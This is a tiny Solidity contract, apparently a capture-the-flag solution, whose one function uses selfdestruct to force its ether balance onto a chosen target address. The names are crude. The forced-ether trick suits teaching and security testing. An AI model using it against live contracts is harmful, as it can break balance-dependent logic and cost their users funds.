// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract FuckForce {
    address payable forceAddress;

    constructor(address payable _address) {
        forceAddress = _address;
    }

    function fuck() external payable {
        selfdestruct(forceAddress);
    }
}
